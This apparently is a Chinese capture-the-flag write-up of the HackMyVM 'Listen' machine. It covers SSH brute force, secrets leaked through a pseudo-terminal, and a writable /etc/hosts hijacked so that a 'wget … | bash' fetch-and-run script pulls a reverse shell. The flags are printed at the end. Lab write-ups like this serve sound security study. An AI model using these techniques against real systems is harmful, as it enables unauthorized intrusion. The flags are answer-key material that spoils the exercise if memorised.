---
title: MazeSec Listen
date: 2025-04-01 17:39:00
categories: 
  - MazeSec
tags:
  - 弱口令
  - 敏感信息泄露
  - /etc/hosts 劫持
---

# Listen

项目地址：https://downloads.hackmyvm.eu/listen.zip

是一个打包好的镜像文件

**注意：导入 ova 时一定要选择我已移动，否则没网**

使用 Nmap 扫描出开放服务及操作系统版本

![](https://pic1.imgdb.cn/item/6a2660c13c9809430d34eda6.png)

## 弱口令

### SSH

再次扫描又开放了

![](https://pic1.imgdb.cn/item/6a2662a63c9809430d34eee8.png)

浏览器访问无响应，使用命令请求拿到内容

![](https://pic1.imgdb.cn/item/6a266afa3c9809430d352df7.png)

在最下面有注释，给出了用户名以及密码哈希

![](https://pic1.imgdb.cn/item/6a266b283c9809430d352e05.png)

因为 SSH 是开放的，所以直接爆破得了，得到

```
login: leo
password: contribute
```

![](https://pic1.imgdb.cn/item/6a266dac3c9809430d352f1c.png)

## 提权

### 敏感信息泄露

看了一下还有两个用户需要提权

![](https://pic1.imgdb.cn/item/6a266e133c9809430d352f2e.png)

真阴啊，还得抓包拿敏感信息提权

![](https://pic1.imgdb.cn/item/6a266e363c9809430d352f30.png)

查看提示

![](https://pic1.imgdb.cn/item/6a266e8a3c9809430d352f55.png)

`/dev/pts/` 是 Linux 的 伪终端（PTY） 设备目录，但是查看又没有 `4`

![](https://pic1.imgdb.cn/item/6a266f5c3c9809430d352fc9.png)

每当用户通过 SSH、telnet、终端模拟器 等方式登录系统时，系统会为其分配一个 `/dev/pts/N`（N为数字编号）

所以我们创建五个 SSH 连接

![](https://pic1.imgdb.cn/item/6a26700c3c9809430d35303a.png)

最后会被输出到终端中

![](https://pic1.imgdb.cn/item/6a26701f3c9809430d353042.png)

提权成功

![](https://pic1.imgdb.cn/item/6a2670603c9809430d353054.png)

### /etc/hosts 劫持

然后发现文件 `listentome.sh` 文件在请求 `ihearyou` 并执行

```bash
wget -O - -q http://listen/ihearyou.sh | bash
```

Ping 过去发现是本地，这通常是在 hosts 中定义的

![](https://pic1.imgdb.cn/item/6a2671423c9809430d35309d.png)

查看文件发现我们可写

![](https://pic1.imgdb.cn/item/6a2671793c9809430d3530b6.png)

于是可以劫持这个文件，修改对应的 IP 解析为我们 Kali 的地址

![](https://pic1.imgdb.cn/item/6a26723e3c9809430d3530f7.png)

创建一个同名的反弹 Shell 文件

![](https://pic1.imgdb.cn/item/6a2672b23c9809430d353123.png)

等待一段时间即可拿到 Shell

![](https://pic1.imgdb.cn/item/6a2672e83c9809430d353139.png)

```
HMVimlistening
HMVthxforlisten
```